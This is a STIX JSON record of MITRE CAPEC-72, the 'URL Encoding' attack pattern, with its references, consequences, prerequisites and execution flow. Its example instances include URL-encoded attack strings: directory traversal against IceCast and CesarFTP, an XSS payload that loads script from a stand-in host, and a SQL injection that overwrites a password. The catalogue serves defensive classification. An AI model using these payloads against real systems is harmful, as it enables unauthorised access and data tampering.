{
    "id": "bundle--91d53cf9-332c-4065-aefc-2b4f541fc407",
    "objects": [
        {
            "created": "2014-06-23T00:00:00.000Z",
            "created_by_ref": "identity--e50ab59c-5c4f-4d40-bf6a-d58418d89bcd",
            "description": "This attack targets the encoding of the URL. An adversary can take advantage of the multiple way of encoding an URL and abuse the interpretation of the URL.",
            "external_references": [
                {
                    "external_id": "CAPEC-72",
                    "source_name": "capec",
                    "url": "https://capec.mitre.org/data/definitions/72.html"
                },
                {
                    "external_id": "CWE-173",
                    "source_name": "cwe",
                    "url": "http://cwe.mitre.org/data/definitions/173.html"
                },
                {
                    "external_id": "CWE-177",
                    "source_name": "cwe",
                    "url": "http://cwe.mitre.org/data/definitions/177.html"
                },
                {
                    "external_id": "CWE-172",
                    "source_name": "cwe",
                    "url": "http://cwe.mitre.org/data/definitions/172.html"
                },
                {
                    "external_id": "CWE-73",
                    "source_name": "cwe",
                    "url": "http://cwe.mitre.org/data/definitions/73.html"
                },
                {
                    "external_id": "CWE-74",
                    "source_name": "cwe",
                    "url": "http://cwe.mitre.org/data/definitions/74.html"
                },
                {
                    "external_id": "CWE-20",
                    "source_name": "cwe",
                    "url": "http://cwe.mitre.org/data/definitions/20.html"
                },
                {
                    "description": "G. Hoglund, G. McGraw, Exploiting Software: How to Break Code, 2004--02, Addison-Wesley",
                    "external_id": "REF-1",
                    "source_name": "reference_from_CAPEC"
                },
                {
                    "description": "Gunter Ollmann, URL Encoded Attacks - Attacks using the common web browser, CGISecurity.com",
                    "external_id": "REF-495",
                    "source_name": "reference_from_CAPEC",
                    "url": "http://www.cgisecurity.com/lib/URLEmbeddedAttacks.html"
                },
                {
                    "description": "T. Berners-Lee, R. Fielding, L. Masinter, RFC 3986 - Uniform Resource Identifier (URI): Generic Syntax, 2005--01",
                    "external_id": "REF-496",
                    "source_name": "reference_from_CAPEC",
                    "url": "http://www.ietf.org/rfc/rfc3986.txt"
                },
                {
                    "description": "T. Berners-Lee, L. Masinter, M. McCahill, RFC 1738 - Uniform Resource Locators (URL), 1994--12",
                    "external_id": "REF-497",
                    "source_name": "reference_from_CAPEC",
                    "url": "http://www.ietf.org/rfc/rfc1738.txt"
                },
                {
                    "description": "HTML URL Encoding Reference, W3Schools.com, Refsnes Data",
                    "external_id": "REF-498",
                    "source_name": "reference_from_CAPEC",
                    "url": "http://www.w3schools.com/tags/ref_urlencode.asp"
                },
                {
                    "description": "The URLEncode and URLDecode Page, Albion Research Ltd",
                    "external_id": "REF-499",
                    "source_name": "reference_from_CAPEC",
                    "url": "http://www.albionresearch.com/misc/urlencode.php"
                },
                {
                    "description": "David Wheeler, Secure Programming for Linux and Unix HOWTO",
                    "external_id": "REF-500",
                    "source_name": "reference_from_CAPEC",
                    "url": "http://www.dwheeler.com/secure-programs/Secure-Programs-HOWTO/filter-html.html#VALIDATING-URIS"
                }
            ],
            "id": "attack-pattern--d859e461-7ca6-46a6-842e-3f1750bc8415",
            "modified": "2022-09-29T00:00:00.000Z",
            "name": "URL Encoding",
            "object_marking_refs": [
                "marking-definition--17d82bb2-eeeb-4898-bda5-3ddbcd2b799d"
            ],
            "type": "attack-pattern",
            "x_capec_abstraction": "Detailed",
            "x_capec_child_of_refs": [
                "attack-pattern--a1af7c24-25cb-46e5-a27b-ed316e1f91ce"
            ],
            "x_capec_consequences": {
                "Access_Control": [
                    "Gain Privileges"
                ],
                "Authorization": [
                    "Gain Privileges"
                ],
                "Availability": [
                    "Resource Consumption (Denial of Service)",
                    "Execute Unauthorized Commands (Run Arbitrary Code)"
                ],
                "Confidentiality": [
                    "Read Data",
                    "Execute Unauthorized Commands (Run Arbitrary Code)",
                    "Gain Privileges"
                ],
                "Integrity": [
                    "Execute Unauthorized Commands (Run Arbitrary Code)"
                ]
            },
            "x_capec_domains": [
                "Software"
            ],
            "x_capec_example_instances": [
                "\n               <xhtml:b>URL Encodings in IceCast MP3 Server.</xhtml:b>\n               <xhtml:p>The following type of encoded string has been known traverse directories against the IceCast MP3 server9:</xhtml:p>\n               <xhtml:div style=\"margin-left:1em;\" class=\"informative\">http://[targethost]:8000/somefile/%2E%2E/target.mp3</xhtml:div>\n               <xhtml:p>or using</xhtml:p>\n               <xhtml:div style=\"margin-left:1em;\" class=\"informative\">\"/%25%25/\" instead of \"/../\".</xhtml:div>\n               <xhtml:p>The control character \"..\" can be used by an adversary to escape the document root.</xhtml:p>See also: CVE-2001-0784",
                "\n               <xhtml:b>Cross-Site Scripting</xhtml:b>\n               <xhtml:div style=\"margin-left:1em;\" class=\"attack\">\n                  <xhtml:b>URL-Encoded attack:</xhtml:b>http://target/getdata.php?data=%3cscript%20src=%22http%3a%2f%2fwww.badplace.com%2fnasty.js%22%3e%3c%2fscript%3e</xhtml:div>\n               <xhtml:div style=\"margin-left:1em;\" class=\"result\">\n                  <xhtml:b>HTML execution:</xhtml:b><script src=\"http://www.badplace.com/nasty.js\"></script></xhtml:div>\n               <xhtml:p>[REF-495]</xhtml:p>\n            ",
                "\n               <xhtml:b>SQL Injection</xhtml:b>\n               <xhtml:div style=\"margin-left:1em;\" class=\"informative\">\n                  <xhtml:b>Original database query in the example file - \"login.asp\":</xhtml:b>SQLQuery = \"SELECT preferences FROM logintable WHERE userid='\" & Request.QueryString(\"userid\") & \"' AND password='\" & Request.QueryString(\"password\") & \"';\"</xhtml:div>\n               <xhtml:div style=\"margin-left:1em;\" class=\"attack\">\n                  <xhtml:b>URL-encoded attack:</xhtml:b>http://target/login.asp?userid=bob%27%3b%20update%20logintable%20set%20passwd%3d%270wn3d%27%3b--%00</xhtml:div>\n               <xhtml:div style=\"margin-left:1em;\" class=\"result\">\n                  <xhtml:b>Executed database query:</xhtml:b>SELECT preferences FROM logintable WHERE userid='bob'; update logintable set password='0wn3d';</xhtml:div>\n               <xhtml:p>From \"URL encoded attacks\", by Gunter Ollmann - http://www.cgisecurity.com/lib/URLEmbeddedAttacks.html</xhtml:p>\n            ",
                "\n               <xhtml:b>Combined Encodings CesarFTP</xhtml:b>\n               <xhtml:p>Alexandre Cesari released a freeware FTP server for Windows that fails to provide proper filtering against multiple encoding. The FTP server, CesarFTP, included a Web server component that could be attacked with a combination of the triple-dot and URL encoding attacks.</xhtml:p>\n               <xhtml:p>An adversary could provide a URL that included a string like</xhtml:p>\n               <xhtml:div style=\"margin-left:1em;\" class=\"informative\">/...%5C/</xhtml:div>\n               <xhtml:p>This is an interesting exploit because it involves an aggregation of several tricks: the escape character, URL encoding, and the triple dot.</xhtml:p>See also: CVE-2001-1335"
            ],
            "x_capec_execution_flow": "<h2> Execution Flow </h2><div><h3>Explore</h3><ol><li> <p> <b>Survey web application for URLs with parameters: </b>Using a browser, an automated tool or by inspecting the application, an adversary records all URLs that contain parameters.</p></li><table><tbody><tr><th>Techniques</th></tr><tr><td>Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.</td></tr></tbody></table></ol></div><div><h3>Experiment</h3><ol><li> <p> <b>Probe URLs to locate vulnerabilities: </b>The adversary uses the URLs gathered in the \"Explore\" phase as a target list and tests parameters with different encodings of special characters to see how the web application will handle them.</p></li><table><tbody><tr><th>Techniques</th></tr><tr><td>Use URL encodings of special characters such as semi-colons, backslashes, or question marks that might be filtered out normally.</td></tr><tr><td>Combine the use of URL encodings with other encoding techniques such as the triple dot and escape slashes.</td></tr></tbody></table></ol></div><div><h3>Exploit</h3><ol><li> <p> <b>Inject special characters into URL parameters: </b>Using the information gathered in the \"Experiment\" phase, the adversary injects special characters into the URL using URL encoding. This can lead to path traversal, cross-site scripting, SQL injection, etc.</p></li></ol></div>",
            "x_capec_extended_description": "\n            <xhtml:p>A URL may contain special character that need special syntax handling in order to be interpreted. Special characters are represented using a percentage character followed by two digits representing the octet code of the original character (%HEX-CODE).</xhtml:p>\n            <xhtml:p>For instance US-ASCII space character would be represented with %20. This is often referred as escaped ending or percent-encoding. Since the server decodes the URL from the requests, it may restrict the access to some URL paths by validating and filtering out the URL requests it received. An adversary will try to craft an URL with a sequence of special characters which once interpreted by the server will be equivalent to a forbidden URL.</xhtml:p>\n            <xhtml:p>It can be difficult to protect against this attack since the URL can contain other format of encoding such as UTF-8 encoding, Unicode-encoding, etc. The adversary could also subvert the meaning of the URL string request by encoding the data being sent to the server through a GET request. For instance an adversary may subvert the meaning of parameters used in a SQL request and sent through the URL string (See Example section).</xhtml:p>\n         ",
            "x_capec_likelihood_of_attack": "High",
            "x_capec_prerequisites": [
                "The application should accepts and decodes URL input.",
                "The application performs insufficient filtering/canonicalization on the URLs."
            ],
            "x_capec_skills_required": {
                "Low": "An adversary can try special characters in the URL and bypass the URL validation.",
                "Medium": "The adversary may write a script to defeat the input filtering mechanism."
            },
            "x_capec_status": "Draft",
            "x_capec_typical_severity": "High",
            "x_capec_version": "3.9"
        }
    ],
    "spec_version": "2.0",
    "type": "bundle"
}